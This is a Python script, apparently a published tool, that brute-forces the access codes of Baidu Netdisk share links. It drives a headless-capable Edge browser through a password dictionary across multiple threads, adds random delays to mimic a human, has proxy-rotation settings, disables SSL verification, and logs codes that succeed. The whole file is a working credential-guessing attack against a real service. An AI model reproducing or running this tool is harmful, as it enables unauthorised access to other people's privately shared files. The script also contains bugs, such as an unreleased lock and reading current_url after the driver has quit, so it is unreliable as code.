from selenium import webdriver
from selenium.webdriver.common import utils
import os
import platform as pf
import time
import re
import urllib,threading,ssl,time,random,http.cookiejar
ssl._create_default_https_context=ssl._create_unverified_context

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from setting import *
pattern = "https://pan.baidu.com/s/.*"
password=""
pwddict=[]
totpwd=0
srctot=0
proxy = {'https':''}

def loaddict():
    ignorelist = {}
    # Load all failed passwords into ignorelist
    if os.path.exists(ignorepwdfile):  # Check if log2.dic exists
        with open(ignorepwdfile, "r") as fp:
            for line in fp:
                ignorelist[line.strip()] = 1  # Mark as failed
    
    # Read the main password dictionary
    with open(pwdfile, "r") as fp:
        for line in fp:
            password = line.strip()
            if password not in ignorelist:  # Exclude failed passwords
                pwddict.append(password)
    
    print(f"Loaded {len(pwddict)} passwords after excluding failed ones.")

print("===========")
print("百度网盘分享文件密码破解器 by MXWXZ   最后测试于2018年5月9日)")
# url=input("请输入URL地址（https://pan.baidu.com/share/init?xxx）：")

# url=url.replace("https://pan.baidu.com/share/init?","")
# pwdfile=input("请输入当前目录下破解字典文件名（留空默认allpwd.dic）：")

if pwdfile == "":
    pwdfile = "allpwd.dic"
# ignorepwdfile=input("请输入当前目录下忽略密码文件名（留空则不使用）：")
ignorepwdfile="log2.dic"
# delay=input("请输入延时毫秒数：")
delay=75
# threadnum=input("请输入线程数：")

# proxyfile=input("请输入代理IP文件名（留空则不使用）：")
proxyfile=""
# proxyurl=input("请输入代理IPAPI地址（留空则不使用）：")
proxyurl=""
# proxylife=input("请输入切换IP频率（秒数）：")
proxylife=40
print("===========")
loaddict()
srctot=totpwd=len(pwddict)
print("密码总数：",totpwd)
# input("按回车键继续……")
print("===========")
pwdlock = threading.Lock()
def GetPwd():
    if pwdlock.acquire(True):
        global totpwd
        if totpwd == 0:
            return ""
        num=random.randint(0,totpwd-1)
        ret=pwddict[num]
        del pwddict[num]
        # print("剩余密码数：",totpwd, end="\r")
        # if totpwd % 100 == 0:
        #     time.sleep(random.randint(3, 5))
        print("剩余密码数：",totpwd)
        totpwd-=1
        pwdlock.release()
        return ret
# options = webdriver.ChromeOptions()

# use Edge instead 
options = webdriver.EdgeOptions()

# 无头浏览器，不弹出图形界面，注释后会弹出图形界面
# options.add_argument('--headless')

options.add_argument('--no-sandbox')
# selenium会输出大量日志，这里将其金庸
options.add_argument('--disable-dev-shm-usage')
options.add_argument('log-level=3') 
        
options.add_experimental_option('excludeSwitches', ['enable-logging'])

options.add_experimental_option('excludeSwitches', ['enable-logging'])

def check(pwd):
    count = 0
    while True:
        
        # prefs = {'profile.default_content_settings.popups': 0, 'download.default_directory': os.getcwd()}
        # options.add_experimental_option('prefs', prefs)

        driver = webdriver.Edge(options=options)
        driver.get(url)
        driver.refresh()
        # time.sleep(5)
        
        # print("wait..")
        # driver.page_source
        try:
            driver.find_element_by_id("accessCode").send_keys(pwd)
            driver.find_element_by_class_name("text").click()
            time.sleep(3)
            tmp = WebDriverWait(driver, 60).until(
            EC.presence_of_element_located((By.ID, element_id)))
            # <span class="EgMMec">全部文件</span>
            # tmp1 = WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.CLASS_NAME, "text")))
        except  Exception:
            driver.quit()
            continue
        # time.sleep(10)
        text = tmp.get_attribute("innerText")
        # text1 = tmp1.get_attribute("innerText")
        count += 1
        if count >= 5:
            break
        print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),"check: %s"%pwd,tmp.get_attribute("innerText"))
        # fp = open("log2.dic", "a")
        # if fp.tell()!=0:
        #     fp.write("\n")
        # fp.write(trying)
        # fp.close()
        current_url = driver.current_url
        driver.quit()
        if current_url.startswith(start_head):
            return True
         
        # if text1 == "保存到网盘":
        #     return True
        if "提取码错误"== text:
            return False
        else:
            break
    return True

filelock = threading.Lock()
maybelock = threading.Lock()
def fuck():
    global password
    # password = ""
    # tot=0
    while password == "":
        time.sleep(int(delay)/1000)
        trying=GetPwd()
        if trying == "":
            break
       
        # prefs = {'profile.default_content_settings.popups': 0, 'download.default_directory': os.getcwd()}
        # options.add_experimental_option('prefs', prefs)

        driver = webdriver.Edge(options=options)
        # url="https://pan.baidu.com/share/init?surl=t5fahahxsAZvNZ0jujrQKQ"
        pwd_url = url + f"&pwd={str(trying).zfill(4)}"
        driver.get(pwd_url)
        print("Test for url: {}".format(url))
        # 直接打开网址显示没有，需要刷新一次
        # driver.refresh()
        # time.sleep(5)
        
        # 有时候会出现无法找到id="zkGv3a"元素的错误
        # 因为网页加载慢，等待一分钟，如何依旧没有，关闭浏览器，进入下次循环
        # <div id="xbwNKkN" style="display: block;">提取码错误</div>
        try:
            # driver.find_element_by_id("accessCode").send_keys(trying)
            # driver.find_element_by_class_name("text").click()
            # time.sleep(random.randint(2,3))
            # tmp = WebDriverWait(driver, 60).until(
            # EC.presence_of_element_located((By.ID, element_id)))
            # tmp1 =  WebDriverWait(driver, 60).until(
            # EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div[1]/div[2]/div[1]")))

            # Assuming driver is already defined and initialized
            # driver.find_element(By.ID, "accessCode").send_keys(trying)

            # driver.find_element(By.ID, "submitBtn").click()
            # refDiv = WebDriverWait(driver, 60).until(
            #     EC.presence_of_element_located((By.CLASS_NAME, "verify-friend"))
            # )
            # submitBtn = WebDriverWait(driver, 60).until(
            #     EC.presence_of_element_located((By.ID, "submitBtn"))
            # )
            # submitBtn.click()

            # Wait for random delay to simulate human interaction
            # time.sleep(random.randint(2, 3))

            # # Wait until the element with the specified ID is present
            # tmp = WebDriverWait(driver, 60).until(
            #     EC.presence_of_element_located((By.ID, element_id))
            # )

            # Wait until the element with the specified class name is present
            tipDiv = WebDriverWait(driver, 60).until(
                EC.presence_of_element_located((By.CLASS_NAME, "tip"))
            ) 
        except  Exception as e:
            print(e)
            driver.quit()
            continue

        # tmp=driver.find_element_by_id("zkGv3a")
        # time.sleep(10)
        text = tipDiv.get_attribute("innerText")
        print( time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) ,": %s"%trying,text)
        # fp = open("log2.dic", "a")
        # if fp.tell()!=0:
        #     fp.write("\n")
        # fp.write(trying)
        # fp.close()
        
        driver.quit()
        if "提取码错误"== text or not driver.current_url.startswith(start_head): 
            if filelock.acquire(True):
                fp = open(ignorepwdfile, "a")
                fp.write(f"{trying}\n")
                fp.close()
                filelock.release()
        elif driver.current_url.startswith(start_head):
            fp = open("password.dic", "a")
            if fp.tell()!=0:
                fp.write("\n")
            fp.write(trying)
            fp.close()
            print(trying)
        else:
            if maybelock.acquire(True):
                fp = open("maybe.dic", "a")
                if fp.tell()!=0:
                    fp.write("\n")
                fp.write(trying)
                fp.close()
                maybelock.release()
            # 再次确认提取码的正确性
            if check(trying) == False:
                if filelock.acquire(True):
                    fp = open(ignorepwdfile, "a")
                    if fp.tell()!=0:
                        fp.write("\n")
                    fp.write(trying)
                    fp.close()
                    filelock.release()
                continue
            # password=trying
            fp = open("yes.dic", "a")
            if fp.tell()!=0:
                fp.write("\n")
            fp.write(trying)
            fp.close()
            print(trying)
        time.sleep(random.randint(1,3))

if __name__=="__main__":
    loaddict()
    threadid=[]
    for i in range(int(threadnum)):
        threadid.append(threading.Thread(target = fuck, args=()))
        threadid[i].start()
        # fuck()
